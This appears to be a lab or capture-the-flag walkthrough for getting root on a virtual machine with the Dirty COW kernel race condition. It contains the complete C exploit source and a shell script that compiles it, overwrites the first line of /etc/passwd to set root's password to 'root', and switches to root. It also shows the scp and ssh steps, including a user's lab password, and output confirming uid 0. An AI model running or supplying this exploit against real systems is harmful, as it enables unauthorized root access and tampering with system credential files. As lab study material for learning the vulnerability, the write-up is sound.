# Changing root's password
- We are going to change the password of root with another dirty cow exploit `scripts/script4`
- The new password will be set to `root`
- Our exploit is gonna change the first line of `/etc/passwd` to `root:roK20XGbWEsSM:0:0:root:/root:/bin/bash`
- `roK20XGbWEsSM` being the hash generated with `crypt("root", "root")`

## C Code
Snippet of the race condition we are going to exploit
https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c
- Compile with `gcc -pthread pokemon.c -o pokemon`

```C
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <unistd.h>

int f;
void *map;
pid_t pid;
pthread_t pth;
struct stat st;

void *madviseThread(void *arg)
{
    int i, c=0;
    for(i=0;i<200000000;i++)
        c+=madvise(map,100,MADV_DONTNEED);
}

int main(int argc,char *argv[])
{
    if(argc<3)
        return 1;
    f=open(argv[1],O_RDONLY);
    fstat(f,&st);
    map=mmap(NULL,
             st.st_size+sizeof(long),
             PROT_READ,
             MAP_PRIVATE,
             f,
             0);
	printf("Changing root's password, this may take a while...\n");
    pid=fork();
    if(pid) {
        waitpid(pid,NULL,0);
        int u,i,o,c=0,l=strlen(argv[2]);
        for(i=0;i<10000/l;i++)
            for(o=0;o<l;o++)
                for(u=0;u<10000;u++)
        c += ptrace(PTRACE_POKETEXT,
                    pid,
                    map+o,
                    *((long*)(argv[2]+o)));
    }
    else {
        pthread_create(&pth,
                       NULL,
                       madviseThread,
                       NULL);
        ptrace(PTRACE_TRACEME);
        kill(getpid(),SIGSTOP);
        pthread_join(pth,NULL);
    }
    return 0;
}
```
## Script
- `chmod +x` to make it executable

```shell
#! /bin/sh

cat << EOF > exploit.c
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <unistd.h>

int f;
void *map;
pid_t pid;
pthread_t pth;
struct stat st;

void *madviseThread(void *arg)
{
    int i, c=0;
    for(i=0;i<200000000;i++)
        c+=madvise(map,100,MADV_DONTNEED);
}

int main(int argc,char *argv[])
{
    if(argc<3)
        return 1;
    f=open(argv[1],O_RDONLY);
    fstat(f,&st);
    map=mmap(NULL,
             st.st_size+sizeof(long),
             PROT_READ,
             MAP_PRIVATE,
             f,
             0);
	printf("Changing root's password, this may take a while...\n");
    pid=fork();
    if(pid) {
        waitpid(pid,NULL,0);
        int u,i,o,c=0,l=strlen(argv[2]);
        for(i=0;i<10000/l;i++)
            for(o=0;o<l;o++)
                for(u=0;u<10000;u++)
        c += ptrace(PTRACE_POKETEXT,
                    pid,
                    map+o,
                    *((long*)(argv[2]+o)));
    }
    else {
        pthread_create(&pth,
                       NULL,
                       madviseThread,
                       NULL);
        ptrace(PTRACE_TRACEME);
        kill(getpid(),SIGSTOP);
        pthread_join(pth,NULL);
    }
    return 0;
}
EOF
gcc -pthread exploit.c -o pokemon
./pokemon /etc/passwd "root:roK20XGbWEsSM:0:0:root:/root:/bin/bash"
rm pokemon
rm exploit.c

echo "The password is root :)"
su root
```
## Running the exploit
- Send the exploit to the machine
```
$ scp scripts/script4 zaz@192.168.56.105:/home/zaz/exploit
[...]
zaz@192.168.56.105's password: 646da671ca01bb5d84dbb5fb2238dc8e
[...]
```
- Connect to the machine
```
$ ssh zaz@192.168.56.105
[...]
zaz@192.168.56.105's password: 646da671ca01bb5d84dbb5fb2238dc8e
[...]
```
- Run the exploit
```
$ ./exploit
Changing root's password, this may take a while...
The password is root :)
Password: root
```

- User check
```
$ whoami && id
root
uid=0(root) gid=0(root) groups=0(root)
```
